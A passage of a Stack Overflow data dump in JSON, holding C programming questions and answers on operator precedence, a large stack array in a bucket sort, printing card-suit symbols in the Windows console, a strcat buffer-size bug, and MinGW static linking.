"https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 4, "last_activity_date": 1461751972, "creation_date": 1461751972, "answer_id": 36886815, "question_id": 36886762, "link": "https://stackoverflow.com/questions/36886762/how-does-the-sequence-of-execution-determined-when-multiple-operators-are-involv/36886815#36886815", "title": "How does the sequence of execution determined when multiple operators are involved?", "body": "<p>As per the <a href=\"http://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow\">operator precedence</a>, </p>\n\n<ul>\n<li><code>==</code> has highest priority,</li>\n<li><code>||</code> is second highest</li>\n<li><code>=</code> is least.</li>\n</ul>\n\n<p>So, </p>\n\n<pre><code>EOLorEOFfound = ch == '\\n' || ch == EOF;\n</code></pre>\n\n<p>is the same as</p>\n\n<pre><code>EOLorEOFfound = ( (ch == '\\n') || (ch == EOF) );\n</code></pre>\n\n<p>So all it does is, compare <code>ch</code> against the given values, and then, assign the result in <code>EOLorEOFfound</code>.</p>\n\n<p>FWIW, point to note, the result of the logical OR (<code>||</code>) is of type <code>int</code>.</p>\n"}], "owner": {"reputation": 424, "user_id": 5576024, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/HqOM5.jpg?s=128&g=1", "display_name": "Alon", "link": "https://stackoverflow.com/users/5576024/alon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 36886815, "answer_count": 2, "score": -1, "last_activity_date": 1461788586, "creation_date": 1461751824, "last_edit_date": 1495540780, "question_id": 36886762, "link": "https://stackoverflow.com/questions/36886762/how-does-the-sequence-of-execution-determined-when-multiple-operators-are-involv", "title": "How does the sequence of execution determined when multiple operators are involved?", "body": "<pre><code>while (!EOLorEOFfound) {\n      int ch == fgetc(stdin);\n      EOLorEOFfound = ch == '\\n' || ch == EOF;\n}\n</code></pre>\n\n<p>Note: <code>EOLorEOFfound</code> is of type bool.</p>\n\n<p>I was given this answer by a StackOverFlow user concerning another problem. See here:</p>\n\n<p><a href=\"https://stackoverflow.com/questions/36867754/how-to-determine-if-fgets-stopped-before-all-letters-were-read\">How to determine if fgets stopped before all letters were read?</a></p>\n\n<p>Now, i have been puzzeling what the expression in the last line of code actually does. I suspect it is some form of the ternary operator maybe? </p>\n"}, {"tags": ["c", "arrays", "bucket-sort"], "comments": [{"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 3, "creation_date": 1461751486, "post_id": 36886466, "comment_id": 61337600, "body": "<code>int (*a)[10] = malloc(sizeof(int[N][10]));</code> .... <code>free(a)</code> at function end."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 3, "creation_date": 1461752074, "post_id": 36886466, "comment_id": 61338031, "body": "Size of that array is limited by stack size due to its local scope."}, {"owner": {"reputation": 56828, "user_id": 4062354, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/xcV4d.png?s=128&g=1", "display_name": "MikeCAT", "link": "https://stackoverflow.com/users/4062354/mikecat"}, "edited": false, "score": 1, "creation_date": 1461756283, "post_id": 36886466, "comment_id": 61340971, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/18676383/runtime-error-stack-overflow\">runtime error (stack overflow)</a>"}, {"owner": {"reputation": 11, "user_id": 6256843, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tg5rV.jpg?s=128&g=1", "display_name": "Koray Alpay", "link": "https://stackoverflow.com/users/6256843/koray-alpay"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461772386, "post_id": 36886466, "comment_id": 61353835, "body": "@BLUEPIXY exactly what im looking for. worked perfect . Thank you so much man!"}], "owner": {"reputation": 11, "user_id": 6256843, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tg5rV.jpg?s=128&g=1", "display_name": "Koray Alpay", "link": "https://stackoverflow.com/users/6256843/koray-alpay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 137, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1461752895, "creation_date": 1461751110, "question_id": 36886466, "link": "https://stackoverflow.com/questions/36886466/cannot-create-an-array-of-5000010", "title": "Cannot create an array of [50000][10]", "body": "<p>below code is for bucketsorting of an array. It works great with 10k dataset. But somehow it stops working for 50k or 100k integers. (Note: there are 50001 integers in the file)</p>\n\n<p>With some printf funtion, i observe that the code can not go further at creation of int a[N][10]. It stops here. It can not get N number. </p>\n\n<blockquote>\n  <p>void bucket_inserting(int b[],int N, int max){</p>\n  \n  <p>int a[N][10]</p>\n</blockquote>\n\n<p>Hope it is clear. It would be nice to get some help from you guys.</p>\n\n<pre><code>int largestNumber(int array[],int n)\n{\n\n   int  maximum, c;\n\n  maximum = array[0];\n\n  for (c = 1; c &lt; n; c++)\n  {\n    if (array[c] &gt; maximum)\n    {\n       maximum  = array[c];\n    }\n  }\n  return maximum;\n}\n\n\nvoid bucket_inserting(int b[],int N, int max){\n\nint a[N][10];\n\nint size,c,k,i,j,temp,range=max/10;\n\nint count[10]= {0, 0, 0, 0, 0, 0, 0, 0, 0, 0};\n\n\n\nfor(i=0;i&lt;N;i++){\n      temp=b[i];\n        for(j=0;j&lt;10;j++){\n            if(temp&gt;=j*(range) &amp;&amp; (temp-1)&lt;(j+1)*(range)){\n            a[count[j]][j]=temp;\n            count[j]=count[j]+1;\n\n            }\n        }\n}\n\n\n\n    /*sort each bucket*/\n\n    for(j=0;j&lt;10;j++){\n        size=count[j];\n        for (i = 1; i &lt; size; i++)\n        {\n            int tmp = a[i][j];\n\n            for (c=i; c&gt;0 &amp;&amp; tmp &lt; a[c-1][j]; c--)\n                a[c][j] = a[c-1][j];\n                a[c][j] = tmp;\n        }\n}\n\n\n\n\n    /*Printing*/\n    for(j=0;j&lt;10;j++){\n        size=count[j];\n        for(i=0;i&lt;size;i++)\n        printf(\"%d \\n\",a[i][j]);\n        }\n\n}\n\n\n\n\nint main(){\n\n\n/*read file*/\n\n\n    FILE *file = fopen(\"t_50000.txt\", \"r\");\n    int lol[50001];\n\n    int i=0, num, max,range;\n    while(fscanf(file, \"%d\", &amp;num) == 1) {\n        lol[i] = num;\n        i++;\n    }\n\n    fclose(file);\n\n/*find max*/\n\nmax= largestNumber(lol,50001);\nbucket_inserting(lol,50001,max);\n\n\n}\n</code></pre>\n"}, {"tags": ["c", "unicode", "playing-cards"], "comments": [{"owner": {"reputation": 35932, "user_id": 1606345, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/IwiIM.png?s=128&g=1", "display_name": "David Ranieri", "link": "https://stackoverflow.com/users/1606345/david-ranieri"}, "edited": false, "score": 0, "creation_date": 1461750006, "post_id": 36885959, "comment_id": 61336492, "body": "Change &quot;Raster fonts&quot; to some unicode font (e.g. &quot;Lucida Console&quot;) in your console"}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1461750170, "post_id": 36885959, "comment_id": 61336618, "body": "Do you mean that you tried it (i.e. just pasting them into your source) and they weren&#39;t displayed properly?"}, {"owner": {"reputation": 31, "user_id": 6196868, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/348646a097bff67b4e6343850e9248ff?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan W", "link": "https://stackoverflow.com/users/6196868/ryan-w"}, "edited": false, "score": 0, "creation_date": 1461750329, "post_id": 36885959, "comment_id": 61336739, "body": "So I changed my font  under the tools-&gt;options-&gt;environment-&gt;fonts and colors-&gt;command window, if that is what you meant.  But when I try to print say &quot;\\x06&quot; it just shows up as a question mark"}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1461750577, "post_id": 36885959, "comment_id": 61336915, "body": "What is &quot;\\x06&quot; meant to be? If it&#39;s an ASCII code below 32, that probably won&#39;t work, since I think those are usually mapped as control codes in terminals, not visible characters."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1461750719, "post_id": 36885959, "comment_id": 61337015, "body": "If it is for a console program <a href=\"http://www.ascii-codes.com/cp850.html\" rel=\"nofollow noreferrer\">see here</a>."}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1461750736, "post_id": 36885959, "comment_id": 61337033, "body": "Are you programming for Windows?"}, {"owner": {"reputation": 31, "user_id": 6196868, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/348646a097bff67b4e6343850e9248ff?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan W", "link": "https://stackoverflow.com/users/6196868/ryan-w"}, "edited": false, "score": 0, "creation_date": 1461750884, "post_id": 36885959, "comment_id": 61337145, "body": "I&#39;m using windows 10"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1461751021, "post_id": 36885959, "comment_id": 61337255, "body": "@RyanW is it a console program (with <code>printf</code>, <code>scanf</code> etc.) ? Or is it a full blown Win32 application?"}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 1, "creation_date": 1461751186, "post_id": 36885959, "comment_id": 61337376, "body": "Yes, try posting some actual code..."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 6196868, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/348646a097bff67b4e6343850e9248ff?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan W", "link": "https://stackoverflow.com/users/6196868/ryan-w"}, "edited": false, "score": 0, "creation_date": 1461750581, "post_id": 36886145, "comment_id": 61336918, "body": "So I&#39;m pretty new to this and I have never used those commands.  I&#39;m trying wchar_t spade = U + 2660 and then wprintf to print like you said but nothing shows up ?"}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1461750713, "post_id": 36886145, "comment_id": 61337010, "body": "If the strings as stored in literal form, no special type should be needed. at least, I paste all kinds of non-ASCII characters into C++ source, and the compiler seems to translate them to UTF-8 or whatever is required, without me having to do anything. (Having said that, to be useful, they&#39;re converted into a UTF-8 string class and rendered in a GUI, not a terminal.)"}], "tags": [], "owner": {"reputation": 55713, "user_id": 26095, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/WLsjF.jpg?s=128&g=1", "display_name": "Sean", "link": "https://stackoverflow.com/users/26095/sean"}, "is_accepted": false, "score": 1, "last_activity_date": 1461750398, "creation_date": 1461750398, "answer_id": 36886145, "question_id": 36885959, "link": "https://stackoverflow.com/questions/36885959/visual-studio-c-program-how-to-print-symbols-for-card-suits/36886145#36886145", "title": "Visual Studio C Program: How to print symbols for card suits?", "body": "<p>You'll need to use the unicode characters for those symbols along with a font that supports them. <a href=\"https://en.wikipedia.org/wiki/Playing_cards_in_Unicode\" rel=\"nofollow\">This page</a> lists the unicode character code for various suits. They are:</p>\n\n<blockquote>\n  <p>Spade = U+2660, Heart = U+2665, Diamond = U+2666, Heart = U+2663</p>\n</blockquote>\n\n<p>This will give you black suits. There's also characters for white suits.</p>\n\n<p>You'll also need to make sure you are using <code>wchar_t</code> to represent the characters, not <code>char</code> as it won't be wide enough. Also, make sure you use functions like <a href=\"http://en.cppreference.com/w/cpp/io/c/fwprintf\" rel=\"nofollow\">wprintf</a> to do your output.</p>\n"}, {"comments": [{"owner": {"reputation": 31, "user_id": 6196868, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/348646a097bff67b4e6343850e9248ff?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan W", "link": "https://stackoverflow.com/users/6196868/ryan-w"}, "edited": false, "score": 0, "creation_date": 1461751186, "post_id": 36886310, "comment_id": 61337373, "body": "I&#39;m trying this but I just get boxes? [], I made sure to change my console font to Lucida Console."}, {"owner": {"reputation": 19601, "user_id": 1620779, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/dlgGb.png?s=128&g=1", "display_name": "sjsam", "link": "https://stackoverflow.com/users/1620779/sjsam"}, "reply_to_user": {"reputation": 31, "user_id": 6196868, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/348646a097bff67b4e6343850e9248ff?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan W", "link": "https://stackoverflow.com/users/6196868/ryan-w"}, "edited": false, "score": 0, "creation_date": 1461751221, "post_id": 36886310, "comment_id": 61337404, "body": "@RyanW : That possibly means your console font is set to something else"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461751610, "post_id": 36886310, "comment_id": 61337705, "body": "To be clear, this is run from the console window obtained by running <code>cmd</code> whose full path is <code>C:\\Windows\\System32\\cmd.exe</code>"}, {"owner": {"reputation": 31, "user_id": 6196868, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/348646a097bff67b4e6343850e9248ff?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan W", "link": "https://stackoverflow.com/users/6196868/ryan-w"}, "edited": false, "score": 0, "creation_date": 1461751786, "post_id": 36886310, "comment_id": 61337823, "body": "I&#39;m fairly positive I am running through the console window and I have changed the font but it still shows boxes?  I can provide screenshots"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461751851, "post_id": 36886310, "comment_id": 61337881, "body": "This is Windows 7. I don&#39;t know if Windows 10 is any different. I would have to swap hard drives to find out, since I have abandoned that version."}, {"owner": {"reputation": 31, "user_id": 6196868, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/348646a097bff67b4e6343850e9248ff?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan W", "link": "https://stackoverflow.com/users/6196868/ryan-w"}, "edited": false, "score": 0, "creation_date": 1461753605, "post_id": 36886310, "comment_id": 61339098, "body": "I figured it out, I guess only the Raster Font works on my computer, thank you for the help."}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 1, "last_activity_date": 1461750759, "creation_date": 1461750759, "answer_id": 36886310, "question_id": 36885959, "link": "https://stackoverflow.com/questions/36885959/visual-studio-c-program-how-to-print-symbols-for-card-suits/36886310#36886310", "title": "Visual Studio C Program: How to print symbols for card suits?", "body": "<p>With Windows console font set to \"Lucida Console\" the following works:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main (void)\n{\n    int i;\n    for(i=3; i&lt;=6; i++)\n         printf(\"%c\", i);\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>\n\n<p>Program output:</p>\n\n<pre><code>\u2665\u2666\u2663\u2660\n</code></pre>\n\n<p>Similarly with \"Consolas\" font.</p>\n"}], "owner": {"reputation": 31, "user_id": 6196868, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/348646a097bff67b4e6343850e9248ff?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan W", "link": "https://stackoverflow.com/users/6196868/ryan-w"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3249, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1461750759, "creation_date": 1461749939, "last_edit_date": 1461750465, "question_id": 36885959, "link": "https://stackoverflow.com/questions/36885959/visual-studio-c-program-how-to-print-symbols-for-card-suits", "title": "Visual Studio C Program: How to print symbols for card suits?", "body": "<p>I'm trying to make a card game and I want to use the actual card suit symbols to print cards as so:<br>\n5\u2663 J\u2666 10\u2660 Q\u2665</p>\n\n<p>Problem is I literally have zero idea how to code these symbols to print successfully in a program.</p>\n"}, {"tags": ["c", "arrays", "fgets", "strcat"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1461749212, "post_id": 36885634, "comment_id": 61335856, "body": "never use <code>gets()</code>, use <code>fgets()</code> instead."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461749351, "post_id": 36885634, "comment_id": 61335967, "body": "<code>strcat(sentence, sent);</code> Can&#39;t it. because <code>sentence</code> is no extra space. E.g <code>char sentence[102] = {&#39; &#39;, &#39;\\0&#39;};</code>"}, {"owner": {"reputation": 163, "user_id": 6260642, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/1280970771931821/picture?type=large", "display_name": "Souvik Saha", "link": "https://stackoverflow.com/users/6260642/souvik-saha"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461749937, "post_id": 36885634, "comment_id": 61336431, "body": "@BLUEPIXY I didnt get you"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461750041, "post_id": 36885634, "comment_id": 61336521, "body": "@SouvikSaha try replace <code>char sentence[] = {&#39; &#39;, &#39;\\0&#39;};</code> with <code>char sentence[102] = {&#39; &#39;, &#39;\\0&#39;};</code> : (sizeof( /*your */ sentence) is 2)"}, {"owner": {"reputation": 163, "user_id": 6260642, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/1280970771931821/picture?type=large", "display_name": "Souvik Saha", "link": "https://stackoverflow.com/users/6260642/souvik-saha"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461750590, "post_id": 36885634, "comment_id": 61336924, "body": "@BLUEPIXY Thank you so much! That did the trick!"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461750680, "post_id": 36885634, "comment_id": 61336986, "body": "<code>strcat</code> does not create an area of the new string unlike java. see <a href=\"http://en.cppreference.com/w/c/string/byte/strcat\" rel=\"nofollow noreferrer\">strcat</a>"}, {"owner": {"reputation": 163, "user_id": 6260642, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/1280970771931821/picture?type=large", "display_name": "Souvik Saha", "link": "https://stackoverflow.com/users/6260642/souvik-saha"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461751726, "post_id": 36885634, "comment_id": 61337773, "body": "@BLUEPIXY okay thanks! I assumed that &#39;strcat&#39; adds the total memory locations of both sent and sentence. Guess I&#39;m not used to string memory allocations of C. Thanks again! This was bumming me out since yesterday!"}], "answers": [{"comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1461751859, "post_id": 36885698, "comment_id": 61337886, "body": "@SouvikSaha what? You said you want to count the number of spaces, now you are saying that&#39;s not enough, what&#39;s your goal anyway?"}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 5, "last_activity_date": 1461749645, "last_edit_date": 1461749645, "creation_date": 1461749301, "answer_id": 36885698, "question_id": 36885634, "link": "https://stackoverflow.com/questions/36885634/code-not-working-as-expected-in-c/36885698#36885698", "title": "Code not working as expected in C", "body": "<p>The problem in your code is with the definition of <code>sentence</code>. When you leave out the array dimension and initialize it, the size of the array will be determined by the length of the initializer.</p>\n\n<p>Quoting the <a href=\"http://linux.die.net/man/3/strcat\" rel=\"nofollow\">man page</a> of <code>strcat()</code></p>\n\n<blockquote>\n  <p>The <code>strcat()</code> function appends the <code>src</code> string to the <code>dest</code> string, overwriting the terminating null byte ('\\0') at the end of <code>dest</code>, and then adds a terminating null byte. The strings may not overlap, <strong>and the <code>dest</code> string must have enough space for the result. If <code>dest</code> is not large enough, program behavior is unpredictable;</strong></p>\n</blockquote>\n\n<p>That is, the program will invoke <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow\">undefined behavior</a>.</p>\n\n<p>This way, <code>sentence</code> has certainly way less memory than it it supposed to hold. Moreover, <code>strcat()</code> is not at all <em>required</em> there.</p>\n\n<p>The correct way to do it will be</p>\n\n<ul>\n<li>Define <code>sentence</code> with a proper dimention, like <code>char sentence[MAXSIZE] =  {0};</code>, where <code>MAXSIZE</code> will be a MACRO having the size of your choice.</li>\n<li>use <code>fgets()</code> to read the user input.</li>\n<li>use <a href=\"http://linux.die.net/man/3/isspace\" rel=\"nofollow\"><code>isspace()</code></a> (from <code>ctype.h</code>) in a loop to check for presence of space in the input string.</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 95690, "user_id": 984823, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2KYN.jpg?s=128&g=1", "display_name": "Joop Eggen", "link": "https://stackoverflow.com/users/984823/joop-eggen"}, "is_accepted": false, "score": 1, "last_activity_date": 1461750580, "creation_date": 1461750580, "answer_id": 36886226, "question_id": 36885634, "link": "https://stackoverflow.com/questions/36885634/code-not-working-as-expected-in-c/36886226#36886226", "title": "Code not working as expected in C", "body": "<p>The following</p>\n\n<pre><code>       if (((ch1 &gt;= 'A') &amp;&amp; (ch1 &lt;= 'Z'))||((ch1 &gt;= 'a') &amp;&amp; (ch1 &lt;= 'z')))\n            count++;\n</code></pre>\n\n<p>probably should be</p>\n\n<pre><code>       if (ch1 != ' ')\n            count++;\n</code></pre>\n\n<p>As now \" 12345\" would not be counted as word.</p>\n\n<p>Also <code>count</code> counts the spaces, so the word count is one more: hence 3 instead of 5.</p>\n\n<p>Your <code>sentence</code> seems to have had the intention of counting the terminatin NUL.</p>\n\n<p>If you want to count real words containing letters, use a bool state whether current and prior state of being in a letter differ.</p>\n\n<p>As mentioned overflow is possible with your code.</p>\n"}], "owner": {"reputation": 163, "user_id": 6260642, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/1280970771931821/picture?type=large", "display_name": "Souvik Saha", "link": "https://stackoverflow.com/users/6260642/souvik-saha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1461750580, "creation_date": 1461749153, "last_edit_date": 1461749882, "question_id": 36885634, "link": "https://stackoverflow.com/questions/36885634/code-not-working-as-expected-in-c", "title": "Code not working as expected in C", "body": "<p>I was working on a program in C to count the number of spaces in a sentence. But I haven't managed to get it to work properly. If I enter  something like <em>Hello world 1234 how are you</em> the output I'm getting is 3 when the output expected is 5.<br>\nMy code is : </p>\n\n<pre><code>//Program to count number of words in a given Sentence\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nint main()\n{\n    char sent[100];\n    char sentence[] = {' ', '\\0'};\n    printf(\"\\nEnter a sentence :\\n\");\n    gets(sent);\n    strcat(sentence, sent);\n    int l = strlen(sentence), i = 0, count = 0, countCh = 0;\n    printf(\"%d\", l);\n    char ch, ch1;\n    for (i = 0; i &lt; (l-1); i++)\n    {\n        ch = sentence[i];\n        if (ch == ' ')\n        {\n            ch1 = sentence[i+1];\n            if (((ch1 &gt;= 'A') &amp;&amp; (ch1 &lt;= 'Z'))||((ch1 &gt;= 'a') &amp;&amp; (ch1 &lt;= 'z')))\n                count++;\n        }\n    }\n    printf(\"\\nNo of words is : %d\", count);\n    return 0;\n}\n</code></pre>\n\n<p>I used the same logic in Java and it worked fine. Could someone explain whats going wrong?</p>\n"}, {"tags": ["c", "mingw", "static-linking", "configure", "zbar"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1461751748, "post_id": 36885333, "comment_id": 61337791, "body": "Maybe your MinGW version does not support it? Are you using libtool? if yes, <a href=\"http://www.mingw.org/wiki/HOWTO_Sneak_GCC_Switches_Past_Libtool\" rel=\"nofollow noreferrer\">this man</a> should help."}], "answers": [{"tags": [], "owner": {"reputation": 1038, "user_id": 547270, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yEM1T.png?s=128&g=1", "display_name": "scrutari", "link": "https://stackoverflow.com/users/547270/scrutari"}, "is_accepted": false, "score": 0, "last_activity_date": 1461791518, "creation_date": 1461791518, "answer_id": 36900981, "question_id": 36885333, "link": "https://stackoverflow.com/questions/36885333/configure-error-unrecognized-option-static-libgcc/36900981#36900981", "title": "configure: error: unrecognized option: -static-libgcc", "body": "<p>The option <code>-static</code> is enough for what you want achieve when you use MinGW toolchain.</p>\n"}], "owner": {"reputation": 62673, "user_id": 492336, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/UjW5c.png?s=128&g=1", "display_name": "sashoalm", "link": "https://stackoverflow.com/users/492336/sashoalm"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 986, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1461791518, "creation_date": 1461748376, "question_id": 36885333, "link": "https://stackoverflow.com/questions/36885333/configure-error-unrecognized-option-static-libgcc", "title": "configure: error: unrecognized option: -static-libgcc", "body": "<p>I'm trying to compile zbar-0.10 to be statically linked to the MinGW dependencies, so it doesn't require <code>libgcc_s_dw2-1.dll</code>, 